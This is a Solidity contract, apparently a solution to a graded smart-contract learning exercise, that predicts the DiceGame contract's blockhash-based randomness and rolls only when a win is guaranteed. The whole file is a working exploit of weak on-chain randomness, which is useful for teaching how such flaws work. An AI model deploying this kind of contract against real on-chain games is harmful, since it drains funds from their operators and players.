pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    error RiggedRoll__NeedMoreFunds();
    error RiggedRoll__WithdrawError();

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable _addr, uint256 _amount) public onlyOwner {
        (bool success,) = _addr.call{value: _amount}("");
        if (!success) {
            revert RiggedRoll__WithdrawError();
        }
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether);
        uint256 roll = _calculateRandomNumber();
        if (roll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }

    function _calculateRandomNumber() private view returns (uint256 roll) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        roll = uint256(hash) % 16;
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
